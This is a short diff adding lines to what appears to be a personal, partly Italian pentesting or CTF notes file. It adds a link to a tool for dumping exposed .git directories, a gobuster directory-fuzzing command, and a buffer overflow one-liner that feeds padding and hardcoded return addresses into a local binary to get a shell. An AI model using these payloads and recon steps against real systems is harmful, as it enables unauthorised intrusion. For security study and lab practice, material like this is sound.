@@ -644,3 +644,10 @@ FARE SCRIPT PER OFFSET
 
 git reset --hard HEAD -> to reset git directory
 git show *HASH*
+https://github.com/Ebryx/GitDump
+
+###MAGARI USA QUESTA?
+gobuster dir -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt
+
+
+(python -c 'print "A" * 40 + "\x00\xc0\xe0\xf7" + "A" * 4 + "\x38\x33\xf5\xf7"'; cat) | ./buff2   
